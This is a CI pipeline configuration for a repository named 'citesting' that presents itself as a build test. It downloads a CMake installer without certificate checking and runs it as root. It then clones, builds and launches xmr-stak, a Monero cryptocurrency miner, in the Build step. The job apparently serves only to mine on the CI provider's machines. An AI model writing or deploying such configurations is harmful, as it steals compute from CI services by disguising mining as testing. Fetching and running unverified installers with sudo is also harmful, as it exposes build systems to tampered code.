bminer415/citesting:
  PreBuild:
    - sudo apt-get update
    - sudo apt-get install -y build-essential libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev software-properties-common g++
    - sudo apt-get upgrade -y
    - export CMAKE_FILE=cmake-3.10.2-Linux-x86_64.sh
    - wget --no-check-certificate https://cmake.org/files/v3.10/$CMAKE_FILE
    - chmod 755 $CMAKE_FILE
    #- which cmake
    #- cmake --version
    #- ls -la /
    - sudo ./$CMAKE_FILE --skip-license --prefix=/usr
    #- ls -la /build
    #- ls -la bin
    #- which cmake
    #- cmake --version
    #- exit 2
    - git clone https://github.com/fireice-uk/xmr-stak.git
    - mkdir xmr-stak/build
    - cd xmr-stak/build
    - cmake ..
    - make install
  Build:
    - cp config.txt xmr-stack/build/bin
    - cd xmr-stak/build/bin
    - ./xmr-stak
  AfterBuildFailure:
    - echo ""

